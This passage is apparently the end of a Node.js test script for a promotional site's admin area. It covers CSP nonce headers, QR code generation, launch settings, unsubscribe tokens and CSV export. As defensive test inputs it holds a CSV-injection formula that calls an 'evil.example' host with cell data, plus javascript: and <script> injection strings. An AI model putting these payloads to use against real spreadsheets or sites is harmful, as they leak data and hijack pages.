    const r1 = await call(page, "", c, { method: "GET" }), r2 = await call(page, "", c, { method: "GET" });
    const csp = r1.headers["Content-Security-Policy"] || "", n1 = (/'nonce-([^']+)'/.exec(csp) || [])[1], n2 = (/'nonce-([^']+)'/.exec(r2.headers["Content-Security-Policy"] || "") || [])[1];
    const script = /script-src ([^;]*)/.exec(csp)[1];
    assert.ok(n1 && n2 && n1 !== n2, "a new nonce on every response");
    assert.strictEqual(r1.headers["Cross-Origin-Opener-Policy"], "same-origin", "COOP same-origin on /admin");
    // every host the admin's views draw images from: the restaurants' photos, in the project's own storage (#163), and no wildcard
    const img = (/img-src ([^;]*)/.exec(csp) || [])[1] || "";
    assert.ok(img.split(" ").includes(new URL(process.env.SUPABASE_URL).origin), "img-src allows the photos' host: " + img);
    assert.ok(!/\*|https:(?!\/\/)/.test(img), "img-src names hosts, no wildcard or bare https: " + img);
    assert.ok(!/unsafe-inline|unsafe-eval|\*/.test(script), "no 'unsafe-inline', 'unsafe-eval' or wildcard for scripts: " + script);
    const tags = [...r1.body.matchAll(/<script\b([^>]*)>/g)].map((m) => m[1]);
    assert.ok(tags.length > 0 && tags.every((t) => t.includes('nonce="' + n1 + '"')), "every script tag carries the response's nonce");
    assert.ok(!/\son[a-z]+="/i.test(r1.body), "no inline event handlers (a nonce can't cover them)");
  }
  console.log(`ok: probe: ${refused}/${total} refused across ${actions.length - open.length} signed-in actions (no cookie, forged, other secret, expired, old version, cross-origin, GET); /admin shows only the sign-in card`);
  // a tracking link's QR (FIX-LIST #105): only this site's own ?src= links; anything else is refused
  const qrOf = async (url) => { const r = await call(api, "qr", { fig_admin: good }, { body: { url } }); return [r.statusCode, JSON.parse(r.body || "{}")]; };
  for (const url of ["https://fig-promo.vercel.app/?src=creator-jane#waitlist", "https://fig-promo.vercel.app/app?src=qr-front-counter"]) {
    const [code, b] = await qrOf(url); assert.strictEqual(code, 200, url); assert.ok(/^<svg[^>]+aria-label="QR code for https/.test(b.svg) && b.svg.includes('fill="#1E5EFF"'), "a QR with FIG's tile for " + url);
  }
  for (const url of ["https://evil.example/?src=x", "https://fig-promo.vercel.app/?src=<b>", "https://fig-promo.vercel.app/admin", "javascript:alert(1)", "https://fig-promo.vercel.app/?src=" + "a".repeat(120), ""])
    assert.strictEqual((await qrOf(url))[0], 400, "the QR maker refuses " + url.slice(0, 50));
  console.log("ok: tracking-link QRs: this site's ?src= links only, with FIG's tile");
  // the set-up QR: module for module the same as the qrcode package's (the app's copy, when it's there; Vercel's build has no app/)
  const qr = require("./qr");
  assert.ok(/^<svg[^>]+viewBox="0 0 53 53"/.test(qr.svg(totp.uri("JBSWY3DPEHPK3PXPJBSWY3DPEHPK3PXP"))), "an otpauth link (111 characters) is a version 7 code (45 modules + border)");
  let ref = null;
  try { ref = require(path.join(__dirname, "../../app/node_modules/qrcode")); } catch { /* not on Vercel */ }
  if (ref) {
    let n = 0;
    for (const text of ["A", "hello world", totp.uri(totp.newSecret()), "x".repeat(150), "y".repeat(210)]) for (let mask = 0; mask < 8; mask++) {
      const mine = qr.make(text, { mask }), theirs = ref.create([{ data: text, mode: "byte" }], { errorCorrectionLevel: "M", version: mine.version, maskPattern: mask });
      for (let r = 0; r < mine.size; r++) for (let c = 0; c < mine.size; c++) assert.strictEqual(mine.dark[r][c], !!theirs.modules.get(r, c), "QR v" + mine.version + " mask " + mask + " at " + r + "," + c);
      if (mask === 0) assert.strictEqual(qr.make(text).mask, ref.create([{ data: text, mode: "byte" }], { errorCorrectionLevel: "M", version: mine.version }).maskPattern, "the same mask choice");
      n++;
    }
    console.log("ok: QR codes match the qrcode package module for module (" + n + " codes, versions 1-10, all 8 masks)");
  }
  // FIG's tile hides the middle of a tracking link's code: it still reads, with the tile knocked out white or seen as all dark (zxing, the app's)
  let zx = null;
  const fakeFetch = global.fetch; global.fetch = realFetch; // the real one for zxing, the fake database again after
  try { zx = await import(require("url").pathToFileURL(path.join(__dirname, "../../app/node_modules/zxing-wasm/dist/es/reader/index.js")).href); } catch { /* not on Vercel */ }
  if (zx) {
    let n = 0;
    for (const text of ["https://fig-promo.vercel.app/app?src=x", "https://fig-promo.vercel.app/app?src=creator-example", "https://fig-promo.vercel.app/?src=qr-front-counter-flyer#waitlist", "https://fig-promo.vercel.app/?src=" + "a".repeat(40) + "#waitlist"]) for (const fill of [0, 255]) {
      const { size, dark } = qr.make(text), t = qr.tileBox(size), M = 6, W = (size + 8) * M, data = new Uint8ClampedArray(W * W * 4).fill(255);
      for (let r = 0; r < size; r++) for (let c = 0; c < size; c++) {
        const v = r >= t.at && r < t.at + t.w && c >= t.at && c < t.at + t.w ? fill : dark[r][c] ? 0 : 255;
        for (let y = 0; y < M; y++) for (let x = 0; x < M; x++) { const i = (((r + 4) * M + y) * W + (c + 4) * M + x) * 4; data[i] = data[i + 1] = data[i + 2] = v; }
      }
      const got = await zx.readBarcodes({ data, width: W, height: W, colorSpace: "srgb" }, { formats: ["QRCode"], tryHarder: true });
      assert.strictEqual(got[0] && got[0].text, text, "a code with the tile reads back: " + text + (fill ? " (tile white)" : " (tile dark)"));
      n++;
    }
    console.log("ok: " + n + " tracking-link codes with FIG's tile read back (zxing)");
  }
  global.fetch = fakeFetch;
  {
  }
  // the launch plan's settings (FIX-LIST #105): empty / null clears to "everyone", 0 and junk are refused, a number saves, clearing again works
  fresh();
  const db = require("./db");
  const cap = () => (table.settings.get("founding_cap") || {}).value;
  for (const empty of [null, "", undefined]) { await db.setFoundingCap(250); assert.strictEqual(cap(), "250", "a number saves"); assert.deepStrictEqual(await db.setFoundingCap(empty), { cap: null }, "empty saves as everyone (" + empty + ")"); assert.strictEqual(cap(), undefined, "no row = everyone"); }
  for (const bad of [0, -5, 1.5, "abc", "5,000", 2e6]) await assert.rejects(db.setFoundingCap(bad), /bad cap/, "the cap refuses " + bad);
  assert.strictEqual(cap(), undefined, "a refused cap leaves it as it was");
  await db.setOpensAt(new Date(Date.now() + 86400000).toISOString()); assert.ok(table.settings.has("opens_at"), "a future opening date saves");
  await assert.rejects(db.setOpensAt(new Date(Date.now() - 86400000).toISOString()), /bad date/, "a past date is refused");
  await assert.rejects(db.setOpensAt("not a date"), /bad date/, "junk is refused");
  await db.setOpensAt(null); assert.ok(!table.settings.has("opens_at"), "clearing the opening date removes it");
  await db.setFoundingUntil("now"); assert.ok(table.settings.has("founding_until"), "let in until now saves");
  await assert.rejects(db.setFoundingUntil("2020-01-01"), /bad until/, "until takes only now or null");
  await db.setFoundingUntil(null); assert.ok(!table.settings.has("founding_until"), "clearing until removes it");
  console.log("ok: launch plan settings: empty = everyone, 0 / junk refused, dates clear");
  // the waitlist emails' unsubscribe links (FIX-LIST #103): a token per email, only it unsubscribes, the same page for anything
  {
    const unsub = require("./unsub"), dbm = require("./db"), handler = require("../unsubscribe");
    const done = []; const real = dbm.waitlistUnsubscribe; dbm.waitlistUnsubscribe = async (e) => { done.push(e); return { found: true }; };
    const t = unsub.token("Ana@Example.com");
    assert.strictEqual(t, unsub.token(" ana@example.com "), "one token per address, however it's typed");
    assert.ok(unsub.valid("ana@example.com", t) && !unsub.valid("bo@example.com", t) && !unsub.valid("ana@example.com", t.slice(0, -1) + (t.endsWith("A") ? "B" : "A")) && !unsub.valid("ana@example.com", ""), "only its own token");
    assert.ok(unsub.link("https://fig-promo.vercel.app", "Ana@Example.com").endsWith("/api/unsubscribe?e=ana%40example.com&t=" + t));
    const hit = async (method, e, tok, ipAddr = "7.7.7.7") => { const res = { statusCode: 0, headers: {}, setHeader(k, v) { this.headers[k] = v; }, end(b) { this.body = b; } };
      await handler({ method, url: "/api/unsubscribe?e=" + encodeURIComponent(e) + "&t=" + encodeURIComponent(tok), headers: { "x-real-ip": ipAddr } }, res); return res; };
    const g = await hit("GET", "ana@example.com", t);
    assert.ok(g.statusCode === 200 && /<form method="post"/.test(g.body) && done.length === 0, "opening the link changes nothing (a mail scanner may open it)");
    const bad = await hit("POST", "bo@example.com", t), good = await hit("POST", "ana@example.com", t);
    assert.deepStrictEqual(done, ["ana@example.com"], "only the right token unsubscribes");
    assert.strictEqual(bad.body.replace(/bo@example\.com/g, "X"), good.body.replace(/ana@example\.com/g, "X"), "the same answer either way (no probing)");
    assert.ok(!/<script/i.test((await hit("GET", "<script>x</script>@a.b", "z")).body), "the address is escaped");
    for (let i = 0; i < 31; i++) await hit("POST", "ana@example.com", t, "6.6.6.6");
    assert.strictEqual(done.length, 31, "30 an hour per address, then nothing more is done");
    dbm.waitlistUnsubscribe = real;
    console.log("ok: unsubscribe links: one token per address, GET changes nothing, only the right token unsubscribes, same answer, escaped, rate-limited");
  }
  // FIX-LIST #170: a waitlist CSV never carries a live formula; free text is tidied before it reaches the admin
  {
    const pages = require("./pages"), dbm = require("./db");
    const src = /const csvCell = (\(v\) => \{[^\n]*\});/.exec(pages.appPage())[1];
    const csvCell = eval(src);
    const evil = '=WEBSERVICE("https://evil.example/?"&A2&B2)';
    assert.strictEqual(csvCell(evil), '"\'=WEBSERVICE(""https://evil.example/?""&A2&B2)"', "a formula is made text");
    for (const lead of ["+", "-", "@", "\t", "\r"]) assert.ok(csvCell(lead + "1+1").startsWith("\"'"), "a cell starting with " + JSON.stringify(lead) + " is made text");
    assert.strictEqual(csvCell("St. Brother André Catholic High School"), '"St. Brother André Catholic High School"', "a plain school is untouched");
    assert.ok(!/[=<>"]/.test(dbm.tidyText(evil + '<script>"x"</script>')), "no = < > or quotes survive the tidy");
    assert.strictEqual(dbm.tidyText("Seneca Polytechnic, Seneca@York Campus"), "Seneca Polytechnic, Seneca@York Campus", "real names keep their commas and @");
    assert.strictEqual(dbm.tidyText("  O’Neil   High\tSchool "), "O’Neil High School");
    assert.strictEqual(dbm.tidyText("x".repeat(200)).length, 80);
    console.log("ok: waitlist CSVs: formulas made text; free text tidied for the admin");
  }
  console.log("ok: admin auth");
})().catch((e) => { console.error(e); process.exit(1); });
